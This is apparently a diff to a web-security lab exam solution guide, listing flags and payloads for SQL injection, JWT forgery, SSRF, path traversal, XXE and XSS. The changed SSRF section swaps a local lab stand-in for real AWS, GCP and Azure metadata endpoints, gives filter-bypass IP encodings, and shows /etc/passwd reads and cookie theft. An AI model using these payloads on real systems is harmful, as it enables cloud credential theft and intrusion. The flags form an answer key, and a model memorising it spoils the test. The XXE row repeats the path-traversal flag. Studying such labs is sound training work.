@@ -11,7 +11,7 @@ tags: [css-exam, labs, solution, web]
 |---|---|---|
 | UNION SQLi | `FLAG{un10n_sql1_dumps_the_secrets_table}` | `UNION SELECT k,v,3 FROM secrets` |
 | JWT forgery | `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}` | forge `role=admin` → `account.php` |
-| SSRF | `FLAG{ssrf_reached_the_internal_metadata_service}` | `fetch.php?url=http://127.0.0.1:8001/metadata.php` |
+| SSRF | `FLAG{ssrf_reached_the_internal_metadata_service}` | `fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web01-stg-role` |
 | Path traversal | `FLAG{tr4versed_out_of_the_docs_directory}` | `download.php?file=../private2/secret_config.txt` |
 | XXE | `FLAG{tr4versed_out_of_the_docs_directory}` | external entity → `file:///…/webapp2/private2/secret_config.txt` (or read `/etc/passwd` to prove it) |
 | Filtered XSS | `FLAG{xss_filter_byp4ss_c00kie}` | bypass the filter (`<img onerror>`) → steal the non-HttpOnly `flag` cookie via `document.cookie` |
@@ -90,22 +90,33 @@ hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt      # or: jwt_tool 
 
 ## 3. SSRF  (`fetch.php?url=`)
 **Answer:** `fetch.php` is a server-side fetcher (a link/image-preview proxy) meant for **external** URLs.
-With no allow-list you aim it at targets only the **server** can reach but you can't — the internal
-**instance-metadata service** (the lab's stand-in for the cloud endpoint `http://169.254.169.254/`, which
-leaks the VM's IAM role + keys) — or at local files via `file://`.
+With no allow-list you aim it at targets only the **server** can reach — the real **cloud instance-metadata
+service** (AWS `169.254.169.254`, GCP `metadata.google.internal`, Azure) or local files via `file://`. The
+crown jewel is the instance's **temporary IAM credentials** (AWS): walk `/latest/meta-data/` →
+`iam/security-credentials/` → the role → the keys.
 **Command:**
 ```
-# intended use (the "main URL") — a normal EXTERNAL fetch (needs internet):
-curl -sG "$B/fetch.php" --data-urlencode "url=https://example.com/"
-# the abuse — an INTERNAL-only service you cannot hit directly, but the server can:
-curl -sG "$B/fetch.php" --data-urlencode "url=http://127.0.0.1:8001/metadata.php"   # -> IAM role + access keys + flag
-curl -sG "$B/fetch.php" --data-urlencode "url=file:///etc/passwd"                   # file:// scheme -> SSRF becomes local file read
+B=http://localhost:8001
+# AWS IMDSv1 — walk the tree to the credentials (easy level, no filter):
+curl -sG "$B/fetch.php" --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"              # -> role: web01-stg-role
+curl -sG "$B/fetch.php" --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web01-stg-role" # -> AccessKeyId/SecretAccessKey/Token + flag
+# file:// — SSRF becomes a local file read:
+curl -sG "$B/fetch.php" --data-urlencode "url=file:///etc/passwd"
+# GCP (needs the header) and Azure (needs Metadata: true):
+curl -sG "$B/fetch.php" --data-urlencode "url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --data-urlencode "header=Metadata-Flavor:Google"
+curl -sG "$B/fetch.php" --data-urlencode "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" --data-urlencode "header=Metadata:true"
+# filter bypass per level (SAME metadata IP, different encoding — all resolve via inet_aton):
+#   medium (literal IP blocked): decimal     http://2852039166/latest/meta-data/iam/security-credentials/web01-stg-role
+#   hard   (+decimal/hex blocked): octal      http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/web01-stg-role
+#   expert (+octal/file blocked): IPv6-mapped http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/web01-stg-role
 ```
-**Result:** the metadata call returns the instance identity, `access-key-id` / `secret-access-key`, and
-`FLAG{ssrf_reached_the_internal_metadata_service}`; the `file://` call returns `/etc/passwd`.
-**Reason:** `file_get_contents($url)` with no scheme/host allow-list — the server will fetch *anything*,
-including loopback/internal addresses and local files. In a real cloud box those leaked keys = account
-takeover. **Fix:** allow-list scheme (`https` only) + destination host, and block link-local/private IPs.
+**Result:** the IAM path returns the temporary-credentials JSON (`AccessKeyId`/`SecretAccessKey`/`Token`)
+and `FLAG{ssrf_reached_the_internal_metadata_service}`; `file://` returns `/etc/passwd`; GCP/Azure return
+their service-account / managed-identity tokens once the required header is set.
+**Reason:** `file_get_contents()` with no scheme/host allow-list, plus host **normalization** (decimal, hex,
+octal and IPv4-mapped IPv6 all resolve to `169.254.169.254`) which defeats naive string blacklists. In a
+real cloud box those temp keys = account takeover. **Fix:** allow-list scheme (`https`) + destination host,
+block link-local/private IPs *after* normalization, and require IMDSv2 (PUT session token).
 Deck: SSRF_Guide · SSRF_Payload.
 
 ## 4. XXE  (`import.php`, POST XML)   *(needs the `php-xml` extension — see note below)*
